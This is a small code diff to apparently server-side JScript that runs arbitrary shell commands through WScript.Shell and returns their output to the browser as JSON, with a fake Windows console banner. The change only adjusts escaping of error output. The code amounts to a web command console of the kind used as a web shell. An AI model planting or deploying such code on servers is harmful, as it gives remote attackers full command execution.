@@ -676,12 +676,12 @@ this.display('Home:Edit');
                 var S = new ActiveXObject("WScript.Shell");
                 var X = S.exec(cmd);//执行
                 content = X.StdOut.ReadAll();//获取返回内容
-                cmderr=str_replace(X.StdErr.ReadAll());//获取错误
+                cmderr=X.StdErr.ReadAll();//获取错误
                 var c=F.string.matches(content,/\[_s_DIR_g_\]((?:.|[\r\n])*)\[_s_DIR_g_\]/i);//匹配
                 var rm=!is_empty(c[0])?c[0]:'';//路径
                 var p=!is_empty(c[1])?c[1]:path;//路径
                 var p=str_replace(F.replace(p,/[\r\n]/ig,''));//去掉换行
-                var s=str_replace(F.replace(content, rm , ''))+cmderr;//核定内容
+                var s=str_replace(F.replace(content, rm , '')+cmderr);//核定内容
                 F.echo('{"msg":"'+s+'","path":"'+p+'"}');//返回json到前台
             }else{
                 F.echo('{"msg":"Microsoft Windows [版本 10.0.10586]\\r\\n(c) 2015 Microsoft Corporation。保留所有权利。","path":"'+str_replace(path)+'"}');//如果提交的是cmd防止循环调用
